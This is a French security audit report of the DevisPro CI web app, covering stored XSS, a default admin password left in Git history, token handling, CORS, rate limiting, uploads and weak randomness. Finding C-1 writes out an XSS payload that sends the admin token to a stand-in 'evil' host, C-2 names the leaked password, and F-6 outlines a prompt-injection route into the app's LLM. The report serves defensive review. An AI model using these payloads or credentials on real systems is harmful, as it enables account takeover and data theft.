# Audit de sécurité — DevisPro CI (backend + frontend)

- **Date** : 2026-09-09
- **Périmètre demandé** : `backend/server.js`, `backend/schema.sql`, `backend/package.json`, `backend/.env.example`, `frontend/js/app.js`, `frontend/js/api.js`
- **Périmètre élargi en cours d'audit** : `frontend/js/bot.js`, `frontend/js/camera.js`, `frontend/js/config.js`, `frontend/admin.html`, `frontend/wrangler.json`, historique Git, `npm audit`
- **Déploiement** : backend sur Render, frontend sur Cloudflare Workers, DB Neon PostgreSQL
- **Nature** : rapport uniquement, aucun correctif appliqué

### Résumé exécutif

| Sévérité | Nombre | Findings |
|---|---|---|
| Critique | 3 | XSS stocké panneau admin, mot de passe admin dans l'historique Git, JWT longue durée dans `localStorage` + en query string |
| Élevée | 6 | CORS fail-open, rate limiting inopérant derrière proxy, XSS stocké frontend artisan + injection HTML email, upload de fichier (validation MIME contournable), pas de révocation de token, `npm audit` (multer HIGH) |
| Moyenne | 9 | TLS DB sans vérif certificat, aléa non cryptographique (codes partage/activation), route publique `/d/:code` sans rate limit, comparaison mot de passe admin non constante, énumération de comptes, abus de coût LLM `/api/bot/photo`, entropie codes d'activation, bcrypt coût 10, PII en clair dans les logs |
| Faible | 8 | CSP désactivée, `algorithms` JWT non épinglé, `express.json` 10 Mo global, LIKE wildcard injection, déploiement Cloudflare trop large, prompt injection auto-limitée, logout côté client seulement, validation de taille d'entrée incomplète |

---

## 1. Gestion des secrets

### Constat général (positif)
- `REQUIRED_ENV = ['JWT_SECRET', 'ADMIN_PASSWORD', 'DATABASE_URL', 'MISTRAL_API_KEY']` avec `process.exit(1)` si absent (`server.js:26-32`). Bon : plus de fallback en dur pour les secrets sensibles depuis le commit `33da7a0`.
- `.env` est dans `.gitignore` (`backend/.gitignore:3`) et n'a jamais été committé (vérifié sur tout l'historique).
- Aucune clé d'API n'est renvoyée dans une réponse HTTP ni journalisée en clair.
- `.env.example` ne contient que des valeurs placeholder.

### Points à corriger
- **`FRONTEND_URL` est un secret de sécurité mais optionnel** (`server.js:67`) — non listé dans `REQUIRED_ENV`. Son absence ouvre le CORS à toutes les origines (voir finding **É-1**).
- **Fallbacks en dur non sensibles** : `BACKEND_URL` (`server.js:37`), `PORT` (`server.js:36`), `PAYMENT_NUMBER = '0759942496'` (`server.js:42`). Non secrets, mais `BACKEND_URL` sert à construire les liens de partage et les `pdf_url` stockés en base : une mauvaise valeur par défaut produit des liens cassés, pas une faille.
- **PII dans les logs applicatifs** (Render capture stdout/stderr) :
  - `server.js:270-273` : `[CRON]` journalise `nom (telephone)` de chaque artisan expiré.
  - `server.js:982` : `[EMAIL]` journalise l'email du client.
  - `server.js:1164` / `server.js:977` : réponse brute Mistral / Brevo journalisée en cas d'erreur (peut contenir des données de devis client).
  - Impact : conservation de données personnelles hors base, dans un système de logs tiers, sans politique de rétention. Recommandation : masquer/tronquer les identifiants dans les logs, ne journaliser que des IDs techniques.

---

## CRITIQUE

### C-1 — XSS stocké dans le panneau d'administration (`frontend/admin.html`)

- **Fichier / lignes** :
  - `frontend/admin.html:569-616` — `tbody.innerHTML = data.artisans.map(a => \`...\${a.nom} \${a.prenom}...\${a.telephone}...\${a.metier}...\`)` : données artisan injectées **sans échappement** dans le DOM.
  - `frontend/admin.html:600` `<div class="td-name">${a.nom} ${a.prenom||''}</div>`, `:601` `<td>${a.telephone}</td><td>${a.metier}</td>`.
  - `frontend/admin.html:592,613` : `onclick="renouvelerArtisan('${a.id}','${a.nom}')"` / `deleteArtisan('${a.id}','${a.nom}')` — `a.nom` injecté **dans un attribut `onclick` entre apostrophes** : un `'` dans le nom suffit à sortir du littéral et exécuter du JS.
  - `frontend/admin.html:651-659` — table des devis : `d.client_nom`, `d.numero`, `d.objet`, `a.nom` injectés de la même manière.
  - Source des données : `server.js:1362-1380` (`/api/admin/artisans`), `server.js:1411-1432` (`/api/admin/devis`). Ces champs viennent de `/api/auth/register` (`server.js:447`, **non authentifié**) et `/api/devis` (`server.js:655`), sans aucune sanitisation ni à l'écriture ni à la lecture (`schema.sql` : `nom VARCHAR(100)`, `metier VARCHAR(100)`, `client_nom VARCHAR(150)` — bornage de longueur uniquement).
- **Impact réel** : un attaquant s'inscrit (route publique, seulement rate-limitée) avec par exemple `nom = <img src=x onerror="fetch('//evil/'+localStorage.dp_admin_token)">`. Dès que l'administrateur ouvre la liste des artisans, le payload s'exécute **dans le contexte de l'origine du panneau admin, avec le `dp_admin_token` accessible dans `localStorage`** (`admin.html:348`). Conséquences : exfiltration du token admin (validité 8 h), puis via l'API admin : suppression d'artisans (`DELETE /api/admin/artisans/:id`), changement de plans, génération de codes d'activation, lecture de tous les devis/clients. Compromission complète de la plateforme sans authentification préalable.
- **Recommandation** :
  - Échapper toute donnée dynamique avant insertion DOM : utiliser `textContent`, ou une fonction `escapeHtml()` sur chaque interpolation, ou `document.createElement` + `.textContent`.
  - Ne jamais passer de données utilisateur dans des attributs `onclick=` en chaîne : attacher les handlers via `addEventListener` et `dataset`.
  - Définir une CSP stricte sur le panneau admin (`default-src 'self'; script-src 'self'`) pour bloquer l'exfiltration et l'inline.
  - Sanitiser côté backend à l'inscription (liste blanche de caractères pour `nom`/`metier`) en défense en profondeur.
  - Ne pas stocker le token admin dans `localStorage` (voir C-3).

### C-2 — Mot de passe admin par défaut présent dans l'historique Git public

- **Fichier / lignes** : `backend/admin_routes.js` (supprimé au commit `0f23d78`) contenait `const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'devispro_admin_2026';`. Le code actuel (`server.js:1332-1339`) a retiré le fallback, **mais la valeur reste dans l'historique du dépôt public `Blud911/devispro-backend`** (`git log -p -S 'devispro_admin_2026'`).
- **Impact réel** : si la variable d'environnement `ADMIN_PASSWORD` déployée sur Render est restée égale à `devispro_admin_2026` (ou à une variante évidente), n'importe qui ayant lu le dépôt peut se connecter sur `POST /api/admin/login` et obtenir un token admin. Comme il n'y a qu'un seul mot de passe admin partagé, sans 2FA ni restriction d'IP, c'est une compromission totale immédiate.
- **Recommandation** :
  - **Vérifier immédiatement** que `ADMIN_PASSWORD` en production n'est pas cette valeur ni dérivée ; la remplacer par un secret aléatoire ≥ 24 caractères.
  - Rotation de `JWT_SECRET` en même temps (invalide tous les tokens émis, y compris ceux qui auraient pu être forgés).
  - Idéalement, purger l'historique Git (`git filter-repo`) ou considérer le secret comme définitivement brûlé.
  - Envisager une authentification admin par compte nominatif + hash bcrypt en base plutôt qu'un mot de passe unique en variable d'env.

### C-3 — JWT longue durée dans `localStorage` et transmis en query string

- **Fichier / lignes** :
  - `frontend/js/api.js:5-8` : `token: localStorage.getItem('dp_token')` ; `setToken` écrit dans `localStorage`. Idem `admin.html:348` (`dp_admin_token`).
  - `server.js:518` : token artisan `expiresIn: '30d'`. `server.js:471,503` : token temporaire `7d`. `server.js:1337` : token admin `8h`.
  - `frontend/js/api.js:56-58` : `getPdfUrl(devisId)` → `.../api/devis/${devisId}/pdf?token=${encodeURIComponent(this.token)}` — le **JWT complet (30 j) passe en paramètre d'URL**.
  - `server.js:731` : `const token = req.headers.authorization?.split(' ')[1] || req.query.token;` — la route PDF accepte volontairement le token en query string.
  - `frontend/js/app.js:240` : `window.open(Api.getPdfUrl(devisId), '_blank')` — l'URL avec token part dans l'historique navigateur, potentiellement dans le `Referer`, et dans les logs d'accès Render / Cloudflare.
- **Impact réel** :
  - `localStorage` est lisible par tout script s'exécutant sur l'origine → chaque finding XSS (C-1, É-3) permet le vol du token.
  - Aucune révocation possible : un token volé reste valide **30 jours**. `logout()` (`app.js:753-757`) ne fait qu'un `localStorage.removeItem` côté client.
  - Le token en query string se retrouve journalisé (access logs, proxies, CDN), dans l'historique et les favoris, et transmis via `Referer` si le PDF contient/charge une ressource externe.
- **Recommandation** :
  - Réduire la durée de vie des tokens artisan (p. ex. 24 h) + refresh token, ou au minimum passer à 7 j.
  - Mécanisme de révocation : `token_version` par artisan incrémentée au logout / changement de mot de passe, vérifiée dans `authMiddleware`.
  - Pour le PDF : générer un token éphémère dédié (scope = un seul devis, TTL court, signé séparément) au lieu de réutiliser le JWT de session ; le passer en en-tête `Authorization` via `fetch` + `blob` plutôt qu'en query string.
  - Envisager un cookie `HttpOnly; Secure; SameSite=Strict` pour le token de session (nécessite d'ajuster CORS + protection CSRF).

---

## ÉLEVÉE

### É-1 — CORS « fail-open » quand `FRONTEND_URL` est absent

- **Fichier / lignes** : `server.js:67-81`.
  ```js
  const allowedOrigins = (process.env.FRONTEND_URL || '').split(',').map(o=>o.trim()).filter(Boolean);
  app.use(cors({ origin: (origin, callback) => {
    if (!origin) return callback(null, true);
    if (allowedOrigins.length === 0 || allowedOrigins.includes(origin)) return callback(null, true);
    return callback(new Error('Origine non autorisée par CORS'));
  }}));
  ```
- **Impact réel** : le commentaire du code annonce un comportement « fail-closed », mais si `FRONTEND_URL` n'est pas défini (variable **optionnelle**, non dans `REQUIRED_ENV`), `allowedOrigins` est vide et **toutes les origines sont acceptées**. De plus `if (!origin) return callback(null, true)` autorise toutes les requêtes sans en-tête `Origin` (curl, scripts). Impact atténué par le fait que l'API utilise des Bearer tokens et non des cookies (une page malveillante ne peut pas rejouer une session), mais : (a) la protection annoncée est illusoire, (b) toute évolution vers des cookies deviendrait immédiatement vulnérable au CSRF, (c) `Access-Control-Allow-Origin` reflété facilite l'exploitation d'autres failles côté navigateur.
- **Recommandation** :
  - Ajouter `FRONTEND_URL` à `REQUIRED_ENV`.
  - Remplacer `allowedOrigins.length === 0 || ...` par un refus strict si la liste est vide.
  - Restreindre `methods` et `allowedHeaders`, ne pas activer `credentials` tant que ce n'est pas nécessaire.

### É-2 — Rate limiting inopérant / mal cadencé derrière le reverse proxy Render

- **Fichier / lignes** :
  - `server.js:86-91` limiter global (`/api/`, 100 req / 15 min).
  - `server.js:96-102` `authLimiter` (8 / 15 min) sur `register`, `login`, `activate`, `admin/login`.
  - `server.js:107-113` `emailLimiter` (20 / 10 min).
  - **Aucun `app.set('trust proxy', ...)` dans tout le code** (`grep` sur `backend/` : rien hors `node_modules`).
  - `express-rate-limit` **5.5.1 installé** (`package.json:12` le fige ; version très ancienne, la branche courante est 7.x). Sa clé par défaut est `req.ip`.
- **Impact réel** :
  - Sans `trust proxy`, `req.ip` = adresse de la connexion entrante = **le proxy interne de Render**, identique pour tous les clients. Conséquences :
    - Le limiter global 100/15 min devient un **pool partagé par toute la plateforme** : un seul client (ou un pic de trafic légitime) épuise le quota et provoque un déni de service pour tous. Un attaquant peut volontairement bloquer toute l'API.
    - `authLimiter` (8/15 min) partagé : 8 tentatives de login **au total** toutes les 15 min pour l'ensemble des utilisateurs → verrouillage collatéral trivial (DoS ciblé sur l'authentification), et par ailleurs le bruteforce par IP réelle n'est pas mesuré.
  - Le store par défaut est **en mémoire** : il est remis à zéro à chaque redéploiement / réveil d'instance (Render free tier se met en veille), et n'est pas partagé si Render lance plusieurs instances → fenêtre de bruteforce rouverte régulièrement.
  - `express-rate-limit` 5.5.1 ne connaît pas les options `standardHeaders` / `legacyHeaders` (`server.js:100-101, 111-112`) : elles sont silencieusement ignorées.
- **Recommandation** :
  - `app.set('trust proxy', 1)` (ou le nombre exact de proxys devant l'app : Cloudflare + Render) pour que `req.ip` reflète le client réel ; vérifier ensuite le comportement avec `express-rate-limit` (v7 émet une validation `ERR_ERL_UNEXPECTED_X_FORWARDED_FOR` utile).
  - Mettre à jour `express-rate-limit` en 7.x (et dé-figer la version).
  - Store partagé et persistant (`rate-limit-redis` / `rate-limit-postgres`) pour survivre aux redéploiements et au scaling.
  - `keyGenerator` explicite basé sur l'IP client validée, éventuellement combiné au `telephone` fourni pour le login.

### É-3 — XSS stocké dans le frontend artisan + injection HTML dans l'email client

- **Fichier / lignes** :
  - `frontend/js/app.js:179-189` : carte devis rendue via `bubble.innerHTML` avec `${extra.client}`, `${extra.numero}`, `${extra.email}`, `${extra.phone}` non échappés (et injectés aussi dans des `onclick="...('${...}')"`).
  - `frontend/js/app.js:551-565` : `card.innerHTML` de la liste des devis avec `${d.numero}`, `${d.client_nom}`, `${d.client_email}` bruts. Le `.replace(/'/g,'')` lignes 533-534 ne retire que les apostrophes (pour l'attribut `onclick`), pas `<`/`>`/`"`.
  - `frontend/js/camera.js:64-69` : `div.innerHTML` avec `${name}` (nom de fichier choisi par l'utilisateur) et `${url}` dans un `onclick`.
  - `server.js:946-950` : construction de `htmlContent` pour Brevo avec `${devis.client_nom}` **non échappé** → injection HTML dans l'email envoyé au client.
  - Bon point : `app.js:192` utilise `bubble.textContent` pour le texte du bot (pas d'injection via la réponse Mistral dans ce chemin).
- **Impact réel** :
  - Un artisan (compte authentifié) peut stocker un `client_nom` / `objet` contenant du HTML/JS. Il se ré-exécute dans **sa propre** session à l'affichage de la liste des devis : impact limité (auto-XSS) sauf si ces données sont aussi rendues ailleurs sans échappement — ce qui est le cas du **panneau admin** (voir C-1, même donnée `client_nom` rendue via `innerHTML` en `admin.html:651-659`). Un artisan malveillant peut donc cibler l'administrateur via un devis.
  - `client_nom` non échappé dans `htmlContent` : un artisan peut injecter des liens / balises dans le corps HTML de l'email reçu par le client (hameçonnage sous l'identité « DevisPro CI »).
- **Recommandation** : échappement systématique (`escapeHtml`) de toute donnée dynamique côté frontend et dans `htmlContent`/`textContent` de l'email ; privilégier `textContent` + création de nœuds ; CSP.

### É-4 — Upload de logo : validation de type contournable, extension contrôlée par l'utilisateur, fichier servi en statique

- **Fichier / lignes** :
  - `server.js:142-152` : `fileFilter` compare `file.mimetype` à `['image/jpeg','image/png','image/webp']`. Le `mimetype` provient de l'en-tête `Content-Type` de la partie multipart, **fourni par le client** → falsifiable.
  - `server.js:135-137` : `filename: cb(null, \`${uuidv4()}${path.extname(file.originalname)}\`)` — l'extension vient du **nom de fichier fourni par le client**. Pas de vérification des « magic bytes ».
  - `server.js:159` : `app.use('/uploads', express.static(...))` — `express.static` fixe le `Content-Type` de réponse d'après l'extension.
  - `server.js:62` : `helmet({ contentSecurityPolicy: false })` — aucune CSP sur l'origine backend.
  - `server.js:145` : `limits: { fileSize: 2 MB }` (correct).
- **Impact réel** : un attaquant authentifié envoie une requête multipart avec `Content-Type: image/png` (passe le filtre) mais `filename="x.html"` et un corps HTML/JS. Le fichier est stocké en `uploads/<uuid>.html` et servi par `express.static` avec `Content-Type: text/html`, exécuté sur l'origine du backend, sans CSP. Vecteurs : hébergement de contenu arbitraire sous le domaine du service (hameçonnage crédible), XSS sur l'origine API si des ressources sensibles y sont accessibles, distribution de malware. L'URL contient un UUID non devinable (atténuation : nécessite d'être communiquée par l'attaquant à ses victimes). Le disque Render étant éphémère, la persistance est limitée mais suffisante pour une campagne courte.
- **Recommandation** :
  - Valider le type réel par lecture des magic bytes (`file-type`), rejeter tout ce qui n'est pas JPEG/PNG/WebP.
  - Forcer l'extension de sortie d'après le type détecté (jamais `path.extname(originalname)`).
  - Servir `/uploads` avec `Content-Type` forcé (`image/*`), `Content-Disposition: attachment` ou `X-Content-Type-Options: nosniff` (helmet le pose déjà globalement — le vérifier ici), idéalement depuis un domaine distinct sans cookie/session.
  - Migrer vers un stockage objet (Cloudflare R2 / S3) avec content-type contrôlé (résout aussi l'éphémérité du disque).
  - Ré-encoder l'image côté serveur (`sharp`) pour neutraliser tout payload embarqué.

### É-5 — Absence de révocation et de rotation des tokens

- **Fichier / lignes** : `server.js:167` (`jwt.verify(token, process.env.JWT_SECRET)` sans autre contrôle), `server.js:518` (30 j), `app.js:753-757` (`logout` = suppression locale uniquement). Pas de table de sessions, pas de `token_version`, pas de liste de révocation.
- **Impact réel** : un token compromis (XSS, fuite en query string, poste partagé) reste exploitable 30 jours. Un changement de mot de passe (fonctionnalité non présente aujourd'hui, mais probable à terme) n'invaliderait rien. Le `logout` ne protège pas un token déjà exfiltré.
- **Recommandation** : colonne `token_version INTEGER` sur `artisans`, incluse dans le payload JWT et comparée dans `authMiddleware` ; incrémentée au logout « toutes sessions », au changement de mot de passe et à la suspension. Pour l'admin, versionner via une variable d'env ou une entrée en base.

### É-6 — Dépendances vulnérables (`npm audit` sur `backend/`)

`npm audit` exécuté le 2026-09-09 — **5 vulnérabilités : 1 haute, 4 modérées. Correctifs disponibles pour toutes.**

| Paquet | Version installée | Sévérité | Détail | Correctif |
|---|---|---|---|---|
| **multer** | 2.2.0 (direct) | **Haute (7.5)** | GHSA-qfvm-cv95-jqjf : DoS par fuite de descripteurs de fichier sur uploads interrompus (spécifique à `=2.2.0`). Également GHSA-wc9g-mqfw-jrwm (DoS via noms de champs multipart), GHSA-535w-7cp7-47q4 (DoS via index de tableau surdimensionné), GHSA-qvfw-j98x-7q72 (bypass de la limite de taille via race condition du `fileFilter` async — basse). | `multer@2.3.0+` |
| **qs** | 6.15.3 (transitif via express/body-parser) | Modérée | GHSA-4mjr-xmp4-gh2g (DoS via `isBuffer` contrôlé par l'attaquant, 5.3), GHSA-x5fp-wj9c-mxmx (bypass de `array-limit`). Exploitable via `express.urlencoded({ extended: true })` (`server.js:83`). | maj `express` |
| **express** | 4.22.2 (direct) | Modérée | Hérite de la vuln `qs`. | `express@4.22.3+` |
| **body-parser** | (transitif) | Modérée | Hérite de la vuln `qs`. | maj `express` |
| **uuid** | 9.0.1 (direct) | Modérée (7.5) | GHSA-w5hq-g745-h8pq : dépassement de tampon dans v3/v5/v6 quand `buf` est fourni. Le code n'utilise que `uuidv4()` sans `buf` → **non exploitable ici**, mais à corriger pour l'hygiène. Le correctif (`uuid@14`) est une montée de version majeure. | `uuid@11.1.1+` |

- **Recommandation** : `npm update` / bump ciblé de `multer` (≥ 2.3.0, priorité **haute**), `express` (≥ 4.22.3), `uuid` (≥ 11.1.1). Dé-figer `express-rate-limit` et passer en 7.x (voir É-2). Ajouter `npm audit --audit-level=high` en CI.

---

## MOYENNE

### M-1 — Connexion PostgreSQL sans vérification du certificat serveur

- **Fichier / lignes** : `server.js:123-126` : `ssl: process.env.DATABASE_URL ? { rejectUnauthorized: false } : false`.
- **Impact réel** : la connexion est chiffrée (TLS) mais **le certificat du serveur n'est pas validé** → un attaquant en position d'homme du milieu sur le lien Render↔Neon (ou via un DNS/routing détourné) peut présenter un faux certificat, intercepter et modifier tout le trafic SQL (identifiants DB, données artisans, hashes de mots de passe, devis clients). Neon fournit une chaîne de confiance standard : `rejectUnauthorized: false` est inutilement permissif.
- **Recommandation** : `ssl: { rejectUnauthorized: true, ca: <CA Neon> }` (ou `sslmode=verify-full` dans la chaîne de connexion). À défaut de CA custom, `rejectUnauthorized: true` seul (Neon utilise des CA publiques) est déjà bien meilleur.

### M-2 — Génération de codes sensibles avec `Math.random()` (non cryptographique)

- **Fichier / lignes** :
  - `server.js:51-56` `makeShareCode()` : 8 caractères parmi 31 → `Math.floor(Math.random() * chars.length)`.
  - `server.js:224-229` `makeActivationCode()` : `'DEV'` + 5 caractères parmi 31, même mécanisme.
  - `server.js:798` : boucle de génération/vérification d'unicité des codes de partage.
- **Impact réel** : `Math.random()` de V8 est un PRNG non cryptographique (xorshift128+). Son état interne peut être reconstruit à partir de quelques sorties observées, rendant les valeurs **suivantes prédictibles**. Un attaquant qui obtient légitimement plusieurs codes de partage (il partage ses propres devis) peut tenter de prédire les codes générés pour d'autres artisans et accéder à des devis (PII client + montants) via `/d/:code`. Pour les codes d'activation, la prédiction permettrait d'activer un compte sans passer par l'administrateur.
- **Recommandation** : `crypto.randomInt()` ou `crypto.randomBytes()` pour tous les codes/identifiants servant de secret ou de contrôle d'accès. Conserver l'alphabet lisible (`ABCDEFGHJKLMNPQRSTUVWXYZ23456789`) mais tirer les indices via `crypto.randomInt(0, chars.length)`.

### M-3 — Route publique `/d/:code` sans rate limiting

- **Fichier / lignes** : `server.js:991-1034`. La route est déclarée hors du préfixe `/api/` → **le limiter global (`server.js:91`) ne s'applique pas**. Aucun autre limiter. `server.js:999` : `req.params.code.toUpperCase()`.
- **Impact réel** :
  - Espace de codes : 31^8 ≈ 8,5·10¹¹ (~39,6 bits) → le bruteforce en aveugle reste peu praticable, mais sans aucun frein l'attaquant peut tester à débit maximal, d'autant que l'aléa est faible (M-2) et la validité longue (7 jours, `server.js:804`).
  - La réponse expose, via le PDF généré, des données personnelles du client (`d.client_nom`, `d.client_telephone`, `d.reference_bien`) et le montant du devis — la requête fait `SELECT dp.*, d.*, a.*` (`server.js:993-999`).
  - Chaque appel déclenche une génération PDF (CPU) → amplification DoS.
- **Recommandation** : appliquer un rate limiter dédié (par IP client réelle) sur `/d/:code` et sur `/api/devis/:id/pdf` ; réduire la fenêtre de validité (48 h ?) ; permettre la révocation d'un lien de partage ; envisager un code plus long ou un vrai jeton signé.

### M-4 — Comparaison du mot de passe admin non constante en temps

- **Fichier / lignes** : `server.js:1336` : `if (password !== process.env.ADMIN_PASSWORD) return res.status(401)...`.
- **Impact réel** : `!==` sur chaîne s'arrête au premier caractère différent → le temps de réponse dépend de la longueur du préfixe correct. Sur un réseau, le signal est noyé dans le bruit (jitter), l'exploitation est difficile mais théoriquement possible avec beaucoup de mesures. Aggravé par l'absence de rate limiting effectif (É-2) et par le fait qu'il n'existe qu'un seul mot de passe partagé.
- **Recommandation** : comparaison à temps constant — `crypto.timingSafeEqual(Buffer.from(password), Buffer.from(process.env.ADMIN_PASSWORD))` après égalisation de longueur (ou comparer des hash SHA-256 des deux valeurs avec `timingSafeEqual`). Idéalement, stocker un hash bcrypt et utiliser `bcrypt.compare` comme pour les artisans.

### M-5 — Énumération de comptes à l'inscription

- **Fichier / lignes** : `server.js:478` : `if (err.code === '23505') return res.status(409).json({ error: 'Ce numéro est déjà inscrit' });`.
- **Impact réel** : permet de déterminer si un numéro de téléphone donné a un compte DevisPro (contrainte `telephone UNIQUE`, `schema.sql:10`). Le login (`server.js:489,492`) renvoie lui un message générique — bonne pratique non tenue à l'inscription. Combiné à un rate limiting défaillant, un attaquant peut cartographier la base d'utilisateurs.
- **Recommandation** : message neutre (« Si ce numéro n'est pas déjà utilisé, l'inscription est prise en compte »), ou envoi d'un code sans divulguer l'état ; a minima, garder un message identique quel que soit le résultat.

### M-6 — Abus de coût sur `/api/bot/photo` (pas de limite de taille ni de rate limiter dédié)

- **Fichier / lignes** : `server.js:1270-1326`. `server.js:1288` : `const { image } = req.body;` — aucune vérification de taille côté serveur (seule borne : `express.json({ limit: '10mb' })`, `server.js:82`). Pas de limiter dédié : seul le limiter global partagé s'applique (et il est défaillant, É-2). L'éligibilité métier est vérifiée (`server.js:1277`) mais tout artisan d'un métier « bâtiment » convient, et un plan payant n'a **aucun quota** (`server.js` : le contrôle `devis_count >= 5` ne concerne que `plan === 'gratuit'`).
- **Impact réel** : un artisan actif (plan payant, ou gratuit sous quota) peut envoyer en boucle des images ~7 Mo à l'API Pixtral (`pixtral-large-latest`, `max_tokens: 800`) → explosion de la facture Mistral, voire épuisement du quota API et indisponibilité de la fonctionnalité pour tous. Même logique, moindre coût, pour `/api/bot/message` (`mistral-large-latest`) : `message` est borné à 2000 caractères (`server.js:1069`) et `history` à 20×2000 (`server.js:1081`), ce qui limite l'amplitude mais pas la fréquence.
- **Recommandation** : limiter la taille de `image` côté serveur (p. ex. 2 Mo décodés), rate limiter dédié strict sur `/api/bot/photo` et `/api/bot/message` (par artisan, pas seulement par IP), quota d'appels IA par artisan et par jour y compris sur les plans payants, alerte de dépassement de budget Mistral.

### M-7 — Entropie faible des codes d'activation

- **Fichier / lignes** : `server.js:224-229` : `'DEV'` + 5 caractères parmi 31 → 31^5 ≈ 2,86·10⁷ (~24,7 bits). Vérification : `server.js:541` `activate` protégé par `authLimiter` (8/15 min) + `authMiddleware` (token « en_attente », trivial à obtenir via `register`).
- **Impact réel** : ~28 millions de combinaisons, à quoi s'ajoute le fait que plusieurs codes valides coexistent (générés par lots, `server.js:1455-1470`, jusqu'à 50 à la fois) → l'espace « au moins un code valide » se réduit à mesure que des codes sont émis. Avec un rate limiting fiable (8/15 min), le bruteforce reste lent ; mais É-2 montre que ce frein est incertain (store en mémoire remis à zéro, bucket partagé). Un code deviné = activation d'un compte + 30 jours d'accès (`server.js:557`) sans paiement.
- **Recommandation** : codes plus longs (≥ 10 caractères aléatoires cryptographiques, cf. M-2), à usage unique (déjà le cas : `used=false`, `server.js:546`), avec expiration (p. ex. 30 jours après génération — actuellement aucune), et idéalement liés dès la génération à un `artisan_id` cible.

### M-8 — Facteur de coût bcrypt à 10

- **Fichier / lignes** : `server.js:465` : `bcrypt.hash(password, 10)`.
- **Impact réel** : coût 10 = 2¹⁰ itérations. En 2026, la recommandation est ≥ 12 (≥ 10 acceptable a minima). `bcryptjs` (implémentation JS pure, `package.json:17`) est en outre ~3× plus lent que `bcrypt` natif : monter le coût a un vrai impact CPU sur Render. En cas de fuite de la table `artisans`, des mots de passe faibles (min. 8 caractères, sans exigence de complexité, `server.js:453`) tomberaient rapidement au crackage.
- **Recommandation** : passer le coût à 12 et mesurer la latence de `login`/`register` sur l'instance Render ; envisager `bcrypt` natif ou `argon2` ; renforcer la politique de mot de passe (longueur ≥ 10, blocage des mots de passe très communs).

### M-9 — Données personnelles en clair dans les logs

Voir section 1 « Gestion des secrets ». `server.js:270-273`, `server.js:982`, `server.js:1164`, `server.js:977`. Impact : conservation non maîtrisée de PII (noms, téléphones, emails, contenu de devis) dans les logs Render. Recommandation : journaliser des IDs, masquer les identifiants directs.

---

## FAIBLE

### F-1 — CSP entièrement désactivée sur le backend
`server.js:62` : `helmet({ contentSecurityPolicy: false })`. Justifié dans le commentaire par « le backend ne sert que du JSON/PDF », mais il sert aussi `/uploads/*` (fichiers utilisateurs, cf. É-4) et la page HTML d'erreur de `/d/:code` (`server.js:1003-1008`, contenu statique — pas de variable interpolée, donc pas de XSS ici, mais l'absence de CSP supprime une défense en profondeur). Recommandation : activer une CSP minimale (`default-src 'none'; img-src 'self'; frame-ancestors 'none'`) adaptée aux réponses réellement servies.

### F-2 — `algorithms` non épinglé dans `jwt.verify`
`server.js:167,215,736` : `jwt.verify(token, process.env.JWT_SECRET)` sans `{ algorithms: ['HS256'] }`. `jsonwebtoken@9` refuse `alg: none` par défaut et n'accepte pas de clé publique là où une clé HMAC est attendue, donc pas de faille exploitable en l'état, mais l'épinglage explicite est une bonne pratique défensive. Recommandation : ajouter `{ algorithms: ['HS256'] }`.

### F-3 — `express.json({ limit: '10mb' })` global
`server.js:82` : toutes les routes, y compris `login`/`register`/`activate`, acceptent des corps jusqu'à 10 Mo. Surface d'abus mémoire/CPU (parsing JSON) sur des routes qui n'ont besoin que de quelques centaines d'octets. Recommandation : limite globale basse (p. ex. `100kb`) et limite dédiée plus large uniquement sur `/api/bot/photo` (et encore, plafonnée, cf. M-6).

### F-4 — Injection de wildcards LIKE/ILIKE
`server.js:639` (`/api/tarifs`, `q` → `%${q}%` dans `LIKE`), `server.js:1364,1374` (`/api/admin/artisans`, `ILIKE`), `server.js:1413` (`/api/admin/devis`). Les requêtes sont **paramétrées** (pas d'injection SQL), mais un `%` ou `_` dans l'entrée agit comme joker : un utilisateur peut élargir ses résultats de recherche (p. ex. `q=%` renvoie tout). Pas de fuite entre artisans pour `/api/tarifs` (filtré par `artisan_id`). Impact quasi nul. Recommandation : échapper `%`, `_`, `\` dans les termes de recherche (`ESCAPE '\'`).

### F-5 — Déploiement Cloudflare trop large
`frontend/wrangler.json` : `"assets": { "directory": "." }` publie tout `frontend/`, y compris `admin.html` (panneau admin exposé publiquement — attendu pour une SPA, mais rend la surface admin découvrable), `js/config.js` (numéros de téléphone publics + base API — non sensible) et le dossier `.wrangler/`. Recommandation : servir le panneau admin depuis un domaine/route séparé avec restriction d'accès (Cloudflare Access, IP allowlist), exclure `.wrangler/` du déploiement.

### F-6 — Injection de prompt dans `/api/bot/message` (portée auto-limitée)
`server.js:1108-1145` : `message`, `history` et `devis_draft` (via `JSON.stringify(devis_draft)` réinjecté dans le prompt système, `server.js:1145`) sont contrôlés par l'artisan. Un artisan peut manipuler le comportement du LLM, mais le résultat ne construit qu'un devis **lui appartenant** (`server.js:1233-1246`, `authMiddleware` + `artisan_id = req.user.id` partout). Pas d'escalade vers d'autres comptes. Impact : dérive du contenu généré, consommation de tokens. Recommandation : séparer strictement instructions système et données (le `devis_draft` devrait être passé comme message `user` structuré, pas concaténé au prompt système), valider le schéma de `devis_draft` côté serveur.

### F-7 — `logout()` côté client uniquement
`frontend/js/app.js:753-757` : supprime `localStorage` mais le JWT reste valide jusqu'à expiration (30 j). Voir É-5. Sur un poste partagé, un token déjà copié reste utilisable.

### F-8 — Validation de taille des entrées incomplète
Plusieurs champs ne sont bornés que par la longueur de colonne Postgres, avec gestion d'erreur inégale :
- `register` (`server.js:447-482`) : `nom`, `prenom`, `metier`, `nom_entreprise` ne sont pas tronqués côté code ; un dépassement de `VARCHAR(100)`/`(150)` lève un `22001` **non capté** ici (contrairement à `/api/devis` qui le gère, `server.js:721`) → réponse 500 générique (pas une fuite, mais incohérent).
- `objet` (`schema.sql:31`, `TEXT`) : aucune borne, ni en base ni dans `/api/devis` (`server.js` : `objet || ''` inséré tel quel) → un artisan peut stocker un texte très volumineux (jusqu'à la limite `express.json` de 10 Mo) répété sur de nombreux devis.
- Bon point : `tronque()` (`server.js:242`) et `normalizeEmail()` (`server.js:247-253`) sont correctement appliqués sur les champs de devis et les emails ; `message` bot borné à 2000 (`server.js:1069`), `history` à 20 entrées (`server.js:1081`), `count` de génération de codes borné à [1,50] (`server.js:1457`).
- Recommandation : bornes de longueur explicites + `400` propre sur tous les champs texte utilisateur (`nom`, `metier`, `objet`, `nom_entreprise`, `reference_bien`), y compris à l'inscription.

---

## Points de conception à considérer (hors sévérité)

